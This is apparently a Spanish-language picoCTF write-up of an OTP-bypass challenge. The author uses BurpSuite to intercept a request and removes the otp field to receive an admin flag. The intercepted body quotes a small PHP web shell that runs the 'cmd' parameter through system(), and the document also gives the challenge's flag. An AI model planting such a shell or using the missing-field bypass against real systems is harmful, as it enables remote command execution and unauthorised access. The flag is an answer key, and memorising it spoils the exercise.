### Descripción
Try [here](http://titan.picoctf.net:61945/) to find the flag

Hints:
1. Try using burpsuite to intercept request to capture the flag.
2. Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.
### Solución
Mediante BurpSuite se introducirán los datos obligatorios a la página y al momento de introducir un OTP cualquiera en la petición de BurpSuite aparecerá lo que se envió:

```
PNG
<?php
if(isset($_GET['cmd'])) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
}
?>
```


Esto lo eliminamos y hacemos un forward lo cual hace que desde el sitio ahora si nos mandé la flag al poder entrar:
```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:61945
Content-Length: 7
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Origin: http://titan.picoctf.net:61945
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:61945/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxVjMsOwiAQRf-FtYsCA0V_poFhiI0tNDxi1PjvjhsTl-fcnPsSuPaHuIinR98JfRMnga2mpZcbZR6MjhLcGbTDORAarQgcgoNoJgthMiGgUzZxl8a2LdnvxJmP-5rZlX4wwWzNLBkP39q91MhOKv0V15JpyWMPVH9yNKp_P-8P1Qwy1g.Z-4fNQ.1dgJfQZrIljDG6_9tJw2bo-zKrY
Connection: keep-alive

otp=123
```

Borrando otp=123 y al hacer el forward nos manda:
```
Welcome, admin you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a}
```

Flag:
picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a}

### Notas adicionales


### Referencias
BurpSuite
